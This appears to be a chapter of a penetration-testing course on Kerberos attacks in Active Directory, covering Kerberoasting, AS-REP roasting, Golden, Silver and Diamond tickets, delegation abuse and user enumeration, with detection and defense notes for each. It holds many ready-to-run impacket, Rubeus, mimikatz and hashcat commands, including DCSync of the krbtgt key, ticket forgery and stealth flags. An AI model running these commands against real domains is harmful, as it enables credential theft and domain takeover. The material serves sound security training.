---
title: "13. Kerberos Attacks"
order: 13
part: "Post-Exploitation & Active Directory"
description: "The Kerberos protocol, Kerberoasting, AS-REP Roasting, Golden/Silver tickets, delegation attacks and user enumeration."
---

## 13.1 The Kerberos protocol (in depth)

The actors:

- **Client:** the user or machine account that authenticates.
- **KDC (Key Distribution Center):** runs on the Domain Controller and consists of two logical services:
- **AS (Authentication Service):** performs the initial authentication and issues the TGT.
- **TGS (Ticket Granting Service):** issues tickets for specific services in exchange for a TGT.
- **Service:** the resource you want to access; in AD it is identified by an **SPN (Service Principal Name)** (e.g. `MSSQLSvc/sql01.corp.local:1433`, `cifs/fs01.corp.local`, `http/web01`). An SPN ties a service instance to an account (a user or machine account).

The five core messages:

| Message | Direction | Content / purpose | Encrypted with |
| --- | --- | --- | --- |
| **AS-REQ** | Client to AS | Username + (if pre-authentication is in use) a timestamp encrypted with the user's key | The user's password key (the pre-auth part) |
| **AS-REP** | AS to Client | TGT + session key | TGT: the **krbtgt** key; the session-key part: the user's key |
| **TGS-REQ** | Client to TGS | TGT + the requested SPN | TGT still with krbtgt; the authenticator with the user's session key |
| **TGS-REP** | TGS to Client | Service ticket (service ticket/TGS) + a new session key | Service ticket: the **service account's** key |
| **AP-REQ** | Client to Service | Service ticket + authenticator | The service account's key (the service decrypts it itself) |

**Pre-authentication:** inside the AS-REQ the client sends a timestamp (PA-ENC-TIMESTAMP) encrypted with a key derived from its password. If the KDC can decrypt it, it knows the client knows the password. This exists to make offline password guessing harder. If pre-auth is disabled on an account (the `DONT_REQ_PREAUTH` flag), the KDC returns an AS-REP without waiting for a timestamp, which is where **AS-REP Roasting** (see 13.4) comes from.

**TGT and PAC:** the TGT is encrypted with the **krbtgt** account's key; it contains the user's identity, the session key, and a **PAC (Privilege Attribute Certificate)**. The PAC carries the user's SIDs and group memberships, and authorization decisions rely on it. Golden/Diamond/Sapphire ticket attacks forge or modify exactly this PAC.

**Service ticket (TGS):** encrypted with the target service account's key. When the KDC issues a ticket and cannot use the service's AES key (because the account does not support AES), it falls back to RC4. **Kerberoasting** (see 13.3) cracks this ticket.

**Encryption types (etype):** determine which algorithm is used for encryption. The most critical table is this one:

| etype (decimal) | etype (hex) | Algorithm | Where you see it / what it means |
| --- | --- | --- | --- |
| 23 | 0x17 | RC4-HMAC (NTLM hash based) | Weak, fast to crack offline; the attacker's preference. 0x17 in event logs |
| 17 | 0x11 | AES128-CTS-HMAC-SHA1 | Modern, slow to crack |
| 18 | 0x12 | AES256-CTS-HMAC-SHA1 | Modern, strongest; the default |
| 1 / 3 | - | DES (old) | No longer used |

The RC4 key is directly the account's NT hash, so cracking an RC4 ticket is the same as turning the NT hash into a password, and it is about 1000x faster than AES. When possible the attacker requests RC4 (etype 23); the defense forces AES.

**Note:** the TGT is encrypted with the **krbtgt** key, and the TGS/service ticket with the **service account's** key. Do not confuse "which hash is cracked by which attack": Kerberoasting targets the service account, AS-REP Roasting the user's own key, Golden Ticket krbtgt, and Silver Ticket a single service account.

## 13.2 Overpass-the-hash / Pass-the-key (brief)

The technique of requesting a Kerberos TGT directly with an NTLM or AES hash (without needing the password) is **overpass-the-hash**, and it relies on Kerberos being able to perform pre-auth with a key instead of a password. This technique is covered in the credential-attacks section, see Section 11. What you need to know here: even if the hash obtained via Kerberoasting/AS-REP cannot be cracked, once an NT/AES hash is captured it is used to produce a Kerberos ticket (e.g. `Rubeus.exe asktgt /user:x /rc4:<hash>` or `impacket-getTGT -hashes :<nt> dom/user`).

## 13.3 Kerberoasting

**The idea (why it works):** by Kerberos design, **any authenticated domain user** can request a TGS ticket for an account that has an SPN, and the KDC does not check whether the client can actually access that service when it issues the ticket (the authorization check is done on the service side, during the AP-REQ phase). The returned TGS ticket is encrypted with the **password key of the service account** the SPN is tied to. The attacker takes this ticket, goes offline, and tries to crack the service account's password with **offline** dictionary/bruteforce. Service accounts usually have old, weak passwords that are rarely changed by a human, and most of them are highly privileged (such as a SQL service account). This makes Kerberoasting one of the most effective lateral/vertical movement techniques in AD.

Target: **user** accounts whose `servicePrincipalName` attribute is populated (machine account passwords are 120 random characters and are not crackable in practice, so machine SPNs are not targeted).

```
# --- Linux (impacket) ---
# just a valid domain user is enough
impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.0.0.1 -request -outputfile hashes.txt
# -request         : actually request TGS ticket for found SPNs (otherwise just lists)
# -request-user X  : request the ticket for a single account only (less noise)
# -outputfile FILE : write the hashes to a file in hashcat format
# -dc-ip           : the DC's IP (required if DNS resolution is a problem)
impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.0.0.1 -request-user sqlsvc -outputfile sql.txt
# With NT hash (if no password, overpass-the-hash):
impacket-GetUserSPNs -hashes :<NThash> -dc-ip 10.0.0.1 corp.local/user -request
# Authenticate with Kerberos ticket (ccache) (without sending password/hash):
export KRB5CCNAME=/tmp/user.ccache
impacket-GetUserSPNs -k -no-pass -dc-ip 10.0.0.1 corp.local/user -request
# -k       : use Kerberos (TGT in KRB5CCNAME) instead of password/hash
# -no-pass : don't prompt for password

# --- Windows (Rubeus) ---
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe kerberoast /user:sqlsvc /nowrap                 # single account, fit the output on one line (easy to copy)
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt        # tgtdeleg trick; roast only accounts that do NOT support AES
Rubeus.exe kerberoast /opsec /outfile:hashes.txt           # daha sessiz: AES hesaplarda RC4'e zorlamaz
Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap   # target only high-privilege (admin) accounts
Rubeus.exe kerberoast /stats                               # stats WITHOUT requesting a ticket: etype, password age, admin count

# --- Built-in (toolless recon) ---
setspn -T corp.local -Q */*                                # list all SPNs in the domain (doesn't require a hash)

# --- PowerView (recon) ---
Get-DomainUser -SPN | select samaccountname,serviceprincipalname    # users with SPNs
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat      # pull the ticket

# --- netexec (nxc) ---
nxc ldap 10.0.0.1 -u user -p pass --kerberoasting kerb.txt          # Find SPNs + write hashes to kerb.txt

# --- Cracking (hashcat) ---
hashcat -m 13100 hashes.txt rockyou.txt                    # RC4  (etype 23, $krb5tgs$23$)
hashcat -m 19600 hashes.txt rockyou.txt                    # AES128 (etype 17, $krb5tgs$17$)
hashcat -m 19700 hashes.txt rockyou.txt                    # AES256 (etype 18, $krb5tgs$18$)
```

Rubeus flag glossary:

| Flag | What it does |
| --- | --- |
| `/opsec` | Runs in a quieter mode; does not "downgrade" to RC4 on accounts that request AES, and does not generate unnecessary anomalies |
| `/rc4opsec` | Obtains the current user's TGT via the `tgtdeleg` trick; only roasts accounts that do **not** have AES enabled |
| `/tgtdeleg` | Obtains a usable TGT for the current user (without requiring a password). Note: on 2019+ servers this no longer guarantees a downgrade to RC4, and an AES256 ticket may be returned *(depends on the domain functional level)* |
| `/ldapfilter:'...'` | Adds an extra LDAP filter to the Kerberoastable user query (e.g. `admincount=1`) |
| `/stats` | Shows the etype/password-age/admin distribution of roastable accounts without requesting any tickets (reconnaissance) |
| `/nowrap` | Outputs the Base64/hash as a single piece without line wrapping (makes copying easier) |

**Targeted Kerberoasting:** if the target account has no SPN but you hold a write right over it such as **GenericWrite / WriteProperty**, you write a forged SPN into the `servicePrincipalName` attribute, roast the ticket, then delete the SPN again. This way you can also crack an account that has no SPN but has a weak password.

```
# Add temporary SPN with PowerView → roast → clean up
Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/svc1'}
Rubeus.exe kerberoast /user:victim /nowrap
Set-DomainObject -Identity victim -Clear serviceprincipalname
```

Hash format reference:

| Attack | Hash prefix | hashcat mode |
| --- | --- | --- |
| Kerberoast RC4 | `$krb5tgs$23$` | 13100 |
| Kerberoast AES128 | `$krb5tgs$17$` | 19600 |
| Kerberoast AES256 | `$krb5tgs$18$` | 19700 |
| AS-REP RC4 | `$krb5asrep$23$` | 18200 |

**Detection/Defense:**

- **Detection:** on the DC, **Event ID 4769** (Kerberos service ticket requested). The classic hunting filter: `4769` + `Ticket Encryption Type = 0x17` (RC4) + `Failure Code = 0x0` + `Service Name ≠ krbtgt` + exclude machine accounts (those ending in `$`). However, 0x17 on its own is also common in normal traffic; the strong signal is **fan-out**: a single principal requesting tickets for a large number of different SPNs in a short time (e.g. 5+ different SPNs within 5 minutes). **Honeypot SPN:** create a trap account with a never-used fake SPN; a 4769 arriving for that account is almost certainly an attack.
- **Defense:** use a **long (25+ character) random password** on service accounts, or **Group Managed Service Accounts (gMSA/dMSA)** (automatic 120+ character passwords). Make accounts **AES-only** (`msDS-SupportedEncryptionTypes`), remove unnecessary SPNs, and take service accounts out of highly privileged groups.

## 13.4 AS-REP Roasting

**The idea (why it works):** if an account has **"Do not require Kerberos preauthentication"** set (`DONT_REQ_PREAUTH`, `userAccountControl` bit 0x400000), the KDC returns an AS-REP to an AS-REQ without looking for timestamp proof. Part of the AS-REP (the part containing the session key) is encrypted with the **user's own password key**. The attacker takes this encrypted block and cracks it offline. The password is the user's own password. No credentials are needed, only a list of valid usernames (although an account is usually used to pull the names from the domain, you can also generate the list with userenum).

```
# --- Linux (impacket) ---
# Unauthenticated: just a username list (returns hashes for accounts with pre-auth disabled)
impacket-GetNPUsers corp.local/ -dc-ip 10.0.0.1 -usersfile users.txt -format hashcat -outputfile asrep.txt
# -usersfile : usernames to try
# -format    : hashcat | john
# Authenticated: automatically finds ALL pre-auth-disabled accounts in the domain
impacket-GetNPUsers corp.local/user:pass -dc-ip 10.0.0.1 -request -format hashcat -outputfile asrep.txt

# --- Windows (Rubeus) ---
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
Rubeus.exe asreproast /user:victim /format:hashcat /nowrap

# --- netexec ---
nxc ldap 10.0.0.1 -u user -p '' --asreproast asrep.txt     # pulls pre-auth-disabled accounts even with an empty password
nxc ldap 10.0.0.1 -u user -p pass --asreproast asrep.txt

# --- Cracking ---
hashcat -m 18200 asrep.txt rockyou.txt                     # $krb5asrep$23$
```

**Detection/Defense:**

- **Detection:** on the DC, **Event ID 4768** (Kerberos TGT/AS-REQ). The marker of interest in AS-REP Roasting: AS-REP requests arriving with **etype 0x17 (RC4)** for pre-auth-disabled accounts, and 4768 attempts for a large number of different users in a short time (an enumeration indicator). *(The exact field signature of 4768 for AS-REP roast should be verified in your environment.)*
- **Defense:** keep `DONT_REQ_PREAUTH` **disabled** on all accounts where possible (this is the default; audit regularly any accounts enabled for legacy application compatibility). If pre-auth must stay enabled, give the account a long/complex password and force AES.

## 13.5 Golden Ticket

**The idea (why it works):** the TGT is encrypted with the **krbtgt** account's key, and the KDC trusts the PAC inside the TGT (user, SIDs, groups). If you capture the krbtgt account's NT or AES key (usually via **DCSync**), you can **produce your own TGT from scratch** without ever asking the KDC for a password: whatever username you want, whatever SID/group memberships you want (e.g. Domain Admins/Enterprise Admins). The KDC accepts this TGT as valid because it is correctly encrypted with the krbtgt key. The result: unlimited, long-lived access over the whole domain = **domain dominance / persistence** (until the krbtgt password is changed, and even then, to cut off the attack's effect the password must be reset **twice**).

```
# 1) get the krbtgt key (DCSync - requires Domain Admin or DS-Replication rights)
impacket-secretsdump corp.local/da:pass@10.0.0.1 -just-dc-user krbtgt
# (mimikatz equivalent)  lsadump::dcsync /user:corp\krbtgt
# From the output: note the NT hash (rc4) and the AES256 key. You also need the Domain SID:
impacket-lookupsid corp.local/user:pass@10.0.0.1   # or: Get-DomainSID (PowerView)

# 2a) Generate and inject golden ticket - Windows (mimikatz)
kerberos::golden /user:Administrator /domain:corp.local /sid:<DOMAIN-SID> /krbtgt:<krbtgt_NThash> /id:500 /ptt
# AES golden (quieter, doesn't produce RC4 anomaly):
kerberos::golden /user:Administrator /domain:corp.local /sid:<DOMAIN-SID> /aes256:<krbtgt_AES256> /id:500 /ptt
# /ptt = pass-the-ticket: inject the ticket directly into the current session (instead of writing to a file)

# 2b) Generate golden ticket - Linux (impacket). Don't give SPN → becomes golden.
impacket-ticketer -nthash <krbtgt_NThash> -domain-sid <DOMAIN-SID> -domain corp.local Administrator
# With AES:
impacket-ticketer -aesKey <krbtgt_AES256> -domain-sid <DOMAIN-SID> -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@dc01.corp.local
```

**AES golden** is preferred, because if the environment is AES-only an RC4 ticket draws suspicion immediately; an AES golden blends in with normal traffic. The **persistence** angle: the krbtgt hash does not change for a long time, so access via a golden ticket can be maintained for months. This is why resetting the krbtgt password twice is critical in incident response.

**Detection/Defense:**

- **Detection:** TGS requests that appear without an AS-REQ (because a golden ticket exists without producing an AS-REP), unusually long ticket lifetimes (mimikatz default is 10 years), 4769 arriving with a nonexistent/disabled username, SID history anomalies. Unrecognized account names in 4769.
- **Defense:** reset the krbtgt password **twice**, periodically and after an incident; limit Domain Admin access (block DCSync); isolate Tier 0 assets.

## 13.6 Silver Ticket

**The idea (why it works):** the service ticket (TGS) is encrypted only with the **service account's** key, and returning to the KDC to validate the PAC is **not mandatory for most services**. If you know the NT/AES key of a service account (the account the SPN is tied to, or a machine account), you can **produce a forged TGS for that service without ever talking to the KDC**. Because the service ticket is decrypted only with its own key, it trusts the PAC inside it without question. Access is limited to **a single service + a single host** (e.g. only `cifs/fs01`), but it is very quiet: no 4768/4769 log is generated on the DC.

```
# Windows (mimikatz) - specify SPN with /target and /service
kerberos::golden /user:Administrator /domain:corp.local /sid:<SID> /target:fs01.corp.local /service:cifs /rc4:<servicehash> /ptt
# With AES: /aes256:<svc_aes>

# Linux (impacket) - giving -spn produces a SILVER ticket
impacket-ticketer -nthash <svc_hash> -domain-sid <SID> -domain corp.local -spn cifs/fs01.corp.local Administrator
```

Where the service key comes from: the machine account hash (for `cifs`, `host`, `ldap`, etc. from SYSTEM), the SQL service account hash (`MSSQLSvc`), and so on. A silver ticket can be produced from a service password cracked via Kerberoasting or from a machine account hash.

**Golden vs. Silver (key distinction):**

|  | Golden Ticket | Silver Ticket |
| --- | --- | --- |
| Target key | **krbtgt** hash | **Service account** hash |
| Ticket produced | TGT (works against every service) | TGS (only a specific SPN) |
| Talks to the KDC | Yes (presents the TGT later to the TGS) | **No** (directly to the service) |
| Scope | The whole domain | A single service + host |
| Noise/detection | Leaves traces in DC logs | Very quiet, no trace on the DC |

**Detection/Defense:**

- **Detection:** because it leaves no trace on the DC, you look at **the service's own** logs and host-based anomalies (unexpected ticket, failure if PAC validation is enabled). A session on the ticket that did not go through krbtgt.
- **Defense:** protect and rotate service/machine account passwords (gMSA), enforce **PAC validation**, and take service accounts out of high privilege.

## 13.7 Delegation attacks

Delegation is a service presenting an identity to **another service** on behalf of a user (e.g. a web server connects to SQL on behalf of the user). When misconfigured, it leads to impersonation. Three types:

**(a) Unconstrained delegation:** if `TRUSTED_FOR_DELEGATION` is set on an account, the **TGT of every user** that connects to this host with Kerberos is stored in the host's memory (LSASS). You take over such a host where you have SYSTEM access, collect the TGTs from memory, and **force** a highly privileged victim (especially a DC) to connect.

```
# Monitor/extract TGTs on the delegated host (Windows)
Rubeus.exe monitor /interval:5 /nowrap          # continuously listen for incoming new TGTs
Rubeus.exe dump /nowrap                          # dump tickets from memory
# Force a DC to connect (coercion):
SpoolSample.exe <dc> <delege-host>               # MS-RPRN "printerbug"
# alternatif zorlamalar: PetitPotam (MS-EFSR), DFSCoerce (MS-DFSNM), Coercer
```

The coerced DC sends the machine account's TGT to the delegate host; with that TGT you can perform DCSync and take over the domain. Note: the TGT of accounts in the `Protected Users` group or marked "sensitive, cannot be delegated" is not forwarded.

**(b) Constrained delegation:** if the account has an `msDS-AllowedToDelegateTo` list defined (specific SPNs), the account can access the services in the list by impersonating any user with **S4U2Self** (obtain a ticket to itself on behalf of a user) + **S4U2Proxy** (carry that ticket to the target SPN).

```
# Windows (Rubeus) - impersonate Administrator with the service account's key
Rubeus.exe s4u /user:websvc /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/fs01.corp.local /ptt
# /altservice: derive different services from the same S4U2Proxy ticket (e.g. cifs + host + http from one ticket)
Rubeus.exe s4u /user:websvc /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/fs01 /altservice:host,http /ptt
# Linux (impacket)
impacket-getST -spn cifs/fs01.corp.local -impersonate Administrator -dc-ip 10.0.0.1 corp.local/websvc:pass
```

**(c) RBCD (Resource-Based Constrained Delegation):** the authority is held **on the resource object itself**: `msDS-AllowedToActOnBehalfOfOtherIdentity`. If you have a write right over the target computer object for this attribute (GenericWrite/GenericAll/WriteProperty), you add a **machine account** you control to this list, then with S4U you impersonate any user on the target on behalf of that machine account. `ms-DS-MachineAccountQuota` (default 10) is used to add a new machine account.

```
# 1) Create a machine account you control (a standard user can if quota>0)
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Passw0rd!' -dc-ip 10.0.0.1 corp.local/user:pass
# 2) Write RBCD on the target computer: add EVIL$ to the "act on behalf" list
impacket-rbcd -delegate-to 'TARGET$' -delegate-from 'EVIL$' -action write -dc-ip 10.0.0.1 corp.local/user:pass
# -delegate-to   : the target object to write msDS-AllowedToActOnBehalfOfOtherIdentity on
# -delegate-from: the (our) account that will gain impersonation rights on this target
# -action        : read | write | remove | flush
# 3) get a service ticket impersonating Administrator as EVIL$
impacket-getST -spn cifs/target.corp.local -impersonate Administrator -dc-ip 10.0.0.1 'corp.local/EVIL$:Passw0rd!'
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@target.corp.local
# Windows equivalent: Set-ADComputer TARGET -PrincipalsAllowedToDelegateToAccount EVIL$  +  Rubeus s4u ...
```

**Detection/Defense (delegation):**

- **Detection:** changes to `msDS-AllowedToActOnBehalfOfOtherIdentity` / `msDS-AllowedToDelegateTo` (object modification events 5136), unusual **S4U2Proxy** ticket flows, new machine account creation (**Event 4741**), Rubeus/Mimikatz process telemetry on delegate hosts (Sysmon), unexpected logon of a DC machine account to a host (4624 type 3 / 4648).
- **Defense:** remove unconstrained delegation entirely; put privileged accounts in **Protected Users** and mark them "sensitive, cannot be delegated"; set `ms-DS-MachineAccountQuota=0`; reduce coercion vectors (disable Print Spooler, PetitPotam patches).

## 13.8 Other Kerberos techniques (brief)

**Diamond Ticket:** instead of producing a forged ticket from scratch like Golden/Silver, it **modifies the PAC of a real TGT obtained from the KDC** (the krbtgt key is required). Because the result looks like a genuine TGT, it bypasses the "TGT appearing without an AS-REQ" detection. `Rubeus.exe diamond /tgtdeleg /ticketuser:... /ticketuserid:... /groups:512 /krbtgt:<hash> /ptt`.

**Sapphire Ticket:** using S4U2Self + **U2U (user-to-user)**, it takes the **real PAC** of a privileged user and places it into a legitimate ticket, so high-privilege impersonation is done without leaving a forged group/SID anomaly.

**Kerberos relay (brief):** like NTLM relay, but an attack that forwards Kerberos AP-REQs (e.g. coerced authentication) to a target service; in some scenarios it leads to RBCD or host takeover.

**Diamond/Sapphire vs Golden detection difference:** Golden leaves a ticket that exists without an AS-REP (detectable); because diamond/sapphire are based on real tickets, they do not give this signal and are stealthier.

## 13.9 User enumeration with Kerberos

```
# Find valid usernames from the Kerberos pre-auth error (NO credentials needed, quiet)
kerbrute userenum -d corp.local --dc 10.0.0.1 users.txt
kerbrute userenum -d corp.local --dc 10.0.0.1 -t 100 -o kerbrute.log users.txt
# if --dc is not given it finds the KDC from DNS; -t threads, -o output log
# Logic: invalid user → KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN
# valid user  → KRB5KDC_ERR_PREAUTH_REQUIRED (or, if pre-auth is disabled, a direct AS-REP/TGT)

# Alternatif enum (RID brute / SID):
nxc smb 10.0.0.1 -u guest -p '' --rid-brute
impacket-lookupsid.py anonymous@10.0.0.1
```

**Detection:** every AS-REQ attempt produces **Event 4768** on the DC; a large number of 4768s resulting in "bad username" = an enumeration indicator.

## 13.10 The clock skew problem

Kerberos uses timestamps to prevent replay attacks, and if the clock difference between the client and the KDC exceeds the **default 5 minutes**, it rejects the ticket: `KRB_AP_ERR_SKEW (clock skew too great)`. This is very common on a Linux attack machine. The fix is to synchronize the machine's clock to the DC:

```
sudo ntpdate <dc-ip>            # Set the time according to the DC (classic)
sudo rdate -n <dc-ip>          # alternative if ntpdate is not available
sudo timedatectl set-ntp off && sudo ntpdate <dc-ip>   # turn off automatic NTP and pin to the DC
# can also be fixed in a single command with faketime:
faketime "$(ntpdate -q <dc-ip> | ...)" impacket-GetUserSPNs ...
```

**In practice:** if an impacket/Rubeus command returns `KRB_AP_ERR_SKEW`, synchronize the clock to the DC right away; do not waste time thinking the username/password is wrong.

**Common mistakes (summary):**

- **Kerberoasting** = a TGS for an SPN-bearing service account, **any** domain user can do it, event **4769** (etype 0x17), hash `$krb5tgs$`, mode **13100** (RC4) / 19600 (AES128) / 19700 (AES256). Offline cracking.
- **AS-REP Roasting** = a pre-auth-**disabled** account (`DONT_REQ_PREAUTH`), no credentials needed, event **4768**, hash `$krb5asrep$`, mode **18200**.
- **Golden** = **krbtgt** hash (whole domain, produces a TGT), **Silver** = **service** hash (single service, produces a TGS, KDC-less/quiet).
- **AES golden/silver** is quieter than RC4 (in an AES-only environment RC4 draws suspicion immediately).
- The TGT is encrypted with **krbtgt** and the TGS with the **service account** key; do not confuse which hash is cracked by which attack.
- **Unconstrained** = capture the TGT (coerce+steal), **Constrained** = S4U2Self/S4U2Proxy, **RBCD** = write right over `msDS-AllowedToActOnBehalfOfOtherIdentity` + a machine account.
- In impacket-ticketer, **no `-spn` means Golden, with it means Silver**.
- `KRB_AP_ERR_SKEW` = clock difference; fix it with `ntpdate`/`rdate`.
